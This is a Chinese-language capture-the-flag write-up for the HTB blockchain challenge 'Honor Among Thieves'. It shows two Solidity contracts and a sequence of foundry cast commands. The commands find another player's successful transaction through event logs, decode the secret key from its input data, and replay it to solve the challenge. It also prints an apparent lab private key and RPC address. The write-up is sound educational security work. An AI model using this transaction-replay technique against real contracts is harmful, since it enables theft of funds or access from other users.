---
title: HTB Blockchain Challenge - Honor Among Thieves
date: {{ date }}
cover   : "/img/htb1.jpeg"
---

Honor Among Thieves
===
* Code - Setup.sol
```solidity=
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Rivals} from "./Rivals.sol";

contract Setup {
    Rivals public immutable TARGET;

    constructor(bytes32 _encryptedFlag, bytes32 _hashed) payable {
        TARGET = new Rivals(_encryptedFlag, _hashed);
    }

    function isSolved(address _player) public view returns (bool) {
        return TARGET.solver() == _player;
    }
}

```

* Code - Rivals.sol

```solidity=

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Rivals {
    event Voice(uint256 indexed severity);

    bytes32 private encryptedFlag;
    bytes32 private hashedFlag;
    address public solver;

    constructor(bytes32 _encrypted, bytes32 _hashed) {
        encryptedFlag = _encrypted;
        hashedFlag = _hashed;
    }

    function talk(bytes32 _key) external {
        bytes32 _flag = _key ^ encryptedFlag;
        if (keccak256(abi.encode(_flag)) == hashedFlag) {
            solver = msg.sender;
            emit Voice(5);
        } else {
            emit Voice(block.timestamp % 5);
        }
    }
}

```
#### 思路
* 可以看到在得到正確的key時，會有一個event，我們可以利用event來追蹤其他人成功解出key的transaction
* 如此一來只要重送Input data就可以解掉這題了


#### 解題過程
* 首先先查詢 foundryup的相關指令
* 會用到的指令有
* cast receipt
* cast logs
* 主要是透過 logs 有一個參數可以查詢 event topic
* topic 產生的方式是 function name + parameter type 的 keccak256
-> 所以我們可以得到event的hash
這邊就使用online tool 來計算即可
![image](https://hackmd.io/_uploads/SybAqi9OT.png)

* 取得包含這個topic的所有tx
`cast logs --from-block 1 --rpc-url http://159.65.20.166:31168/rpc 0x8be9391af7bcf072cee3c17fdbdfa444b42ad0d498941bcd0eb684da1ebe0d62
`
![image](https://hackmd.io/_uploads/Hy7fjoqOp.png)


* 發現 severity == 5 的 event
* TX HASH 是 `0x78ad7dc36a3de19a1606390ac2dc978f77fa5d253eda5e0c4219f69fe203929e`
* 檢視TX詳細內容 
* `cast receipt --rpc-url http://159.65.20.166:31168/rpc 0x78ad7dc36a3de19a1606390ac2dc978f77fa5d253eda5e0c4219f69fe203929e`
![image](https://hackmd.io/_uploads/Hksaoj5da.png)

* INPUT DATA  `0x52eab0fadff33a1b2c1b6333553e4e280f600886993e5469e05b4931c5c19c93fce7b58f`

* 這邊用 [input data decoder](https://lab.miguelmota.com/ethereum-input-data-decoder/example/ ) 來解析
* 要有 `Rivals.sol` 的 ABI
![image](https://hackmd.io/_uploads/r1aG3scu6.png)

* 可以知道 `_key` 就是 `0xdff33a1b2c1b6333553e4e280f600886993e5469e05b4931c5c19c93fce7b58f`

* 解題`cast send --rpc-url http://159.65.20.166:31168/rpc --private-key "0x8746fad80df99a853573ed2ab842a08a2bde1724343e19ec6f867d77ff776993" 0xaFB86492DD72903c3cE48761613cF3EB59dAde7d "talk(bytes32)"  0xdff33a1b2c1b6333553e4e280f600886993e5469e05b4931c5c19c93fce7b58f`
* 確認成功
* `cast call --rpc-url http://159.65.20.166:31168/rpc --private-key "0x8746fad80df99a853573ed2ab842a08a2bde1724343e19ec6f867d77ff776993" 0x3CBC547eE5EF958791108f27Fd541c88D9AB143E "isSolved(address)" 0x3c8abBf477294512FC9ba8F911a0aFC6868dd2AF`
![image](https://hackmd.io/_uploads/S16uhicOT.png)
